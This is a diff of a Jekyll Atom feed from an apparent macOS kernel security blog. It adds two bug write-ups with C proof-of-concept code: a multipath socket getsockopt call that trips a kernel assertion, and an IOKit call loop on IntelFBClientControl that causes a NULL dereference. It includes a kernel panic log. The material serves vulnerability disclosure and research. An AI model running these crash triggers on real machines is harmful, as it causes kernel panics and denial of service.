@@ -1,4 +1,178 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-07-10T23:00:05+08:00</updated><id>http://localhost:4000/</id><title type="html">Panicall’s Blog</title><subtitle>security knowledge, vulnerabilities details, fuzzing method, etc.</subtitle><entry><title type="html">CVE-2018-4283: IOGraphics, OOB Read</title><link href="http://localhost:4000/vulnerabilities/2018/07/10/CVE-2018-4283.html" rel="alternate" type="text/html" title="CVE-2018-4283: IOGraphics, OOB Read" /><published>2018-07-10T21:31:00+08:00</published><updated>2018-07-10T21:31:00+08:00</updated><id>http://localhost:4000/vulnerabilities/2018/07/10/CVE-2018-4283</id><content type="html" xml:base="http://localhost:4000/vulnerabilities/2018/07/10/CVE-2018-4283.html">&lt;h1 id=&quot;description&quot;&gt;Description&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-07-10T23:13:59+08:00</updated><id>http://localhost:4000/</id><title type="html">Panicall’s Blog</title><subtitle>security knowledge, vulnerabilities details, fuzzing method, etc.</subtitle><entry><title type="html">NO02: BSD getsockopt, assert failure</title><link href="http://localhost:4000/vulnerabilities/2018/07/10/NO02.html" rel="alternate" type="text/html" title="NO02: BSD getsockopt, assert failure" /><published>2018-07-10T23:08:00+08:00</published><updated>2018-07-10T23:08:00+08:00</updated><id>http://localhost:4000/vulnerabilities/2018/07/10/NO02</id><content type="html" xml:base="http://localhost:4000/vulnerabilities/2018/07/10/NO02.html">&lt;h1 id=&quot;description&quot;&gt;Description&lt;/h1&gt;
+&lt;p&gt;This case is of type Assert Failure. Not accepted by apple as vulnerability any more.&lt;/p&gt;
+
+&lt;h1 id=&quot;environment&quot;&gt;Environment&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;OS: 		    macOS 10.13.5&lt;/li&gt;
+  &lt;li&gt;Module:	    BSD&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;panic-report&quot;&gt;Panic Report&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;panic(cpu 0 caller 0xffffff8003df2892): assertion failed: mpo == NULL || sopt-&amp;gt;sopt_valsize == sizeof (int), file: /Users/xxxxxxxx/Vuln/myxnu/build-xnu-4570.41.2/xnu-4570.41.2/bsd/netinet/mptcp_subr.c, line: 1113
+Backtrace (CPU 0), Frame : Return Address
+0xffffff8866f23aa0 : 0xffffff8003943f26 
+0xffffff8866f23af0 : 0xffffff8003abcdf4 
+0xffffff8866f23b30 : 0xffffff8003aad0a9 
+0xffffff8866f23bb0 : 0xffffff80038dc190 
+0xffffff8866f23bd0 : 0xffffff80039435fa 
+0xffffff8866f23d00 : 0xffffff800394339c 
+0xffffff8866f23d60 : 0xffffff8003df2892 
+0xffffff8866f23d90 : 0xffffff8003dfa5ef 
+0xffffff8866f23e40 : 0xffffff8003f83815 
+0xffffff8866f23eb0 : 0xffffff8003f91fc5 
+0xffffff8866f23f10 : 0xffffff8003fc6a4b 
+0xffffff8866f23fa0 : 0xffffff80038dc976 
+
+BSD process name corresponding to current thread: syz-executor0
+Boot args: kext-dev-mode=1 debug=0x146 kcsuffix=development
+
+Mac OS version:
+17D47
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;poc&quot;&gt;PoC&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+#include &amp;lt;netinet/in.h&amp;gt;
+#include &amp;lt;netinet/tcp.h&amp;gt;
+
+#define AF_MULTIPATH 39
+
+int main(int argc, const char * argv[]) {
+    int sockfd = socket(AF_MULTIPATH, SOCK_STREAM, IPPROTO_TCP);
+    int flag = 0;
+    socklen_t len = 1;
+    
+    setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (void *)&amp;amp;flag, 4);
+    getsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (void *)&amp;amp;flag, &amp;amp;len);
+    
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h1&gt;
+&lt;p&gt;Since this type case is not vulnerability, the vendor(apple) may not fix it. Please don’t use this PoC code to do any malicious things. Just for fun.&lt;/p&gt;</content><author><name></name></author><category term="Case" /><summary type="html">Description This case is of type Assert Failure. Not accepted by apple as vulnerability any more.</summary></entry><entry><title type="html">NO01: AppleGraphicsControl, NULL Page Reference</title><link href="http://localhost:4000/vulnerabilities/2018/07/10/NO01.html" rel="alternate" type="text/html" title="NO01: AppleGraphicsControl, NULL Page Reference" /><published>2018-07-10T23:01:00+08:00</published><updated>2018-07-10T23:01:00+08:00</updated><id>http://localhost:4000/vulnerabilities/2018/07/10/NO01</id><content type="html" xml:base="http://localhost:4000/vulnerabilities/2018/07/10/NO01.html">&lt;h1 id=&quot;description&quot;&gt;Description&lt;/h1&gt;
+&lt;p&gt;This case is of type NULL Pointer Deference. Not accepted by apple as vulnerability any more.&lt;/p&gt;
+
+&lt;h1 id=&quot;environment&quot;&gt;Environment&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;OS: 		    macOS 10.13.5&lt;/li&gt;
+  &lt;li&gt;Module:	    AppleGraphicsControl.kext&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;poc&quot;&gt;PoC&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;IOKit/IOKitLib.h&amp;gt;
+
+
+void trigger(io_connect_t conn, uint32_t value)
+{
+    uint64_t INPUTSCALAR[8];
+    uint32_t INPUTSCALARCNT = 0;
+    
+    char INPUTSTRUCT[4096];
+    size_t INPUTSTRUCTCNT = 0X1000;
+    
+    uint64_t OUTPUTSCALAR[8] = {0};
+    uint32_t OUTPUTSCALARCNT = 0;
+    
+    char OUTPUTSTRUCT[4096];
+    size_t OUTPUTSTRUCTCNT = 0X1000;
+    
+    //FILL INPUT
+    for (int i=0; i&amp;lt;1024; i++) {
+        INPUTSCALAR[0] = value;
+        INPUTSCALARCNT = 1;
+        
+        OUTPUTSCALARCNT = 1;
+        INPUTSTRUCTCNT = 29;
+        OUTPUTSTRUCTCNT = 0;
+        
+        printf(&quot;i=%d\n&quot;, i);
+        *(uint32_t*)INPUTSTRUCT = i;
+        *(uint32_t*)&amp;amp;INPUTSTRUCT[4] = 1;
+        
+        IOConnectCallMethod(
+                            conn,
+                            0x4108,
+                            INPUTSCALAR,
+                            INPUTSCALARCNT,
+                            INPUTSTRUCT,
+                            INPUTSTRUCTCNT,
+                            OUTPUTSCALAR,
+                            &amp;amp;OUTPUTSCALARCNT,
+                            OUTPUTSTRUCT,
+                            &amp;amp;OUTPUTSTRUCTCNT);
+    }
+
+}
+
+
+int main(){
+    
+    kern_return_t err;
+    
+    CFMutableDictionaryRef Matching = IOServiceMatching(&quot;IntelFBClientControl&quot;);
+    
+    if(!Matching){
+        
+        printf(&quot;UNABLE TO CREATE SERVICE MATCHING DICTIONARY\n&quot;);
+        
+        return 0;
+        
+    }
+    
+    io_iterator_t iterator;
+    
+    err = IOServiceGetMatchingServices(kIOMasterPortDefault, Matching, &amp;amp;iterator);
+    
+    if (err != KERN_SUCCESS){
+        
+        printf(&quot;NO MATCHES\n&quot;);
+        return 0;
+    }
+    
+    io_service_t service = IOIteratorNext(iterator);
+    
+    if (service == IO_OBJECT_NULL){
+        
+        printf(&quot;UNABLE TO FIND SERVICE\n&quot;);
+        
+        return 0;
+        
+    }
+    
+    io_connect_t CONN = MACH_PORT_NULL;
+    
+    err = IOServiceOpen(service, mach_task_self(), 2, &amp;amp;CONN);
+    
+    if (err != KERN_SUCCESS){
+        
+        printf(&quot;UNABLE TO GET USER CLIENT CONNECTION\n&quot;);
+        
+        return 0;
+        
+    }else{
+        
+        printf(&quot;GOT USERCLIENT CONNECTION: %X, TYPE:%D\n&quot;, CONN, 0);
+        
+    }
+    
+    trigger(CONN, 0x4118);
+    
+    printf(&quot;PANIC?\n&quot;);
+    
+    return 0;
+    
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h1&gt;
+&lt;p&gt;Since this type case is not vulnerability, the vendor(apple) may not fix it. Please don’t use this PoC code to do any malicious things. Just for fun.&lt;/p&gt;</content><author><name></name></author><category term="Case" /><summary type="html">Description This case is of type NULL Pointer Deference. Not accepted by apple as vulnerability any more.</summary></entry><entry><title type="html">CVE-2018-4283: IOGraphics, OOB Read</title><link href="http://localhost:4000/vulnerabilities/2018/07/10/CVE-2018-4283.html" rel="alternate" type="text/html" title="CVE-2018-4283: IOGraphics, OOB Read" /><published>2018-07-10T21:31:00+08:00</published><updated>2018-07-10T21:31:00+08:00</updated><id>http://localhost:4000/vulnerabilities/2018/07/10/CVE-2018-4283</id><content type="html" xml:base="http://localhost:4000/vulnerabilities/2018/07/10/CVE-2018-4283.html">&lt;h1 id=&quot;description&quot;&gt;Description&lt;/h1&gt;
 &lt;p&gt;There is an OOB read vulnerability exists in IOGraphics due to wrong create/release logic.&lt;/p&gt;
 
 &lt;h1 id=&quot;environment&quot;&gt;Environment&lt;/h1&gt;
